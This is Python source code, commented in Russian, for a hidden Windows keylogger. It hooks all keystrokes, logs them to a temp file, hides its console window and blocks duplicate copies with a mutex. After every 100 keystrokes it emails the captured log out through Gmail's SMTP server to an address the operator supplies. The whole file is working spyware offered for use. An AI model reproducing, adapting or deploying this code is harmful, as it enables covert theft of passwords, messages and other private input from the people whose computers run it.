import pyWinhook as pyHook
import pythoncom
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32event, win32api, winerror


def email():
    mail_content = '''
    Привет, я кейлогер!
    '''

    # Получатель, почта кейлоггера и пароль от нее
    sender_address = "адрес почты для кейлогера"
    sender_pass = "пароль от почты"
    receiver_address = "почта на которую будут отправляться письма"

    # Настраиваем MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'It`s a me, PyLogger!'  # Тема письма

    # Читаем файл - отправляем логи
    message.attach(MIMEText(mail_content, 'plain'))
    file = open("C:/Windows/Temp/klog.txt", "r")
    stringlogs = file.read()
    file.close()
    message.attach(MIMEText(stringlogs))

    # Создаем SMTP сессию для отправки письма
    session = smtplib.SMTP('smtp.gmail.com', 587)  # Сервер и порт gmail
    session.starttls()  # Защищенное соединение
    session.login(sender_address, sender_pass)  # Заходим в наш аккаунт
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Mail Sent')


# Фильтр клавиш
def KeyFilters(event):
    if (event.KeyID == 13):
        Keylogger.i += ' [Enter] '
    elif (event.KeyID == 162 or event.KeyID == 163):
        Keylogger.i += ' [CTRL] '
    elif (event.KeyID == 164 or event.KeyID == 165):
        Keylogger.i += ' [ALT] '
    elif (event.KeyID == 8):
        Keylogger.i += ' [BackSpace] '
    elif (event.KeyID == 160 or event.KeyID == 161):
        Keylogger.i += ' [SHIFT] '
    elif (event.KeyID == 46):
        Keylogger.i += ' [Delete] '
    elif (event.KeyID == 32):
        Keylogger.i += ' [Space] '
    elif (event.KeyID == 27):
        Keylogger.i += ' [Escape] '
    elif (event.KeyID == 9):
        Keylogger.i += ' [TAB] '
    elif (event.KeyID == 20):
        Keylogger.i += ' [CapsLock] '
    elif (event.KeyID == 38):
        Keylogger.i += ' [Up] '
    elif (event.KeyID == 40):
        Keylogger.i += ' [Down] '
    elif (event.KeyID == 37):
        Keylogger.i += ' [Left] '
    elif (event.KeyID == 39):
        Keylogger.i += ' [Right] '
    elif (event.KeyID == 91):
        Keylogger.i += ' [Windows] '
    else:
        Keylogger.i += chr(event.Ascii)# Если айди не попадает под наши "категории" даем ему имя "символа"
    return True


# Содержит необходимые переменные для работы кейлогера
class Keylogger:
    i = ''
    log_path = ("C:/Windows/Temp/klog.txt")  # Путь к сохранениям логов
    MAX_KEYSTROKES = 100  # Максимальное к-во символов, после него следует отправка письма


# Записываем собраные клавиши в файл
def writeToFile():
    file = open(Keylogger.log_path, "a")
    file.write(Keylogger.i)
    file.close()
    return True


# Позволяет кейлогеру запускаться "на заднем фоне"
class myThread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter

    def run(self):
        main()


# Запрещаем копии кейлогера
def disallow_Multiple_Instances():
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        exit(0)
    x = ''
    data = ''
    count = 0


# Инициализируем переменные для sending_procedure
def initialize():
    hm.UnhookKeyboard()
    Keylogger.i = None
    Keylogger.i = ''
    hm.HookKeyboard()


# Записываем клавиши которые мы "прослушали" и отправляем через почту
def sending_procedure():
    if len(Keylogger.i) > Keylogger.MAX_KEYSTROKES:
        writeToFile()
        initialize()
        email()
        open("C:/Windows/Temp/klog.txt", 'w').close()


# "Слушатель" клавиш
def OnKeyboardEvent(event):
    KeyFilters(event)
    sending_procedure()
    return True


# Скрытие консоли
def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


# Запуск кейлогера
def main():
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


hide()
hm = pyHook.HookManager()
disallow_Multiple_Instances()
thread = myThread(1, "Thread", 1)
thread.start()
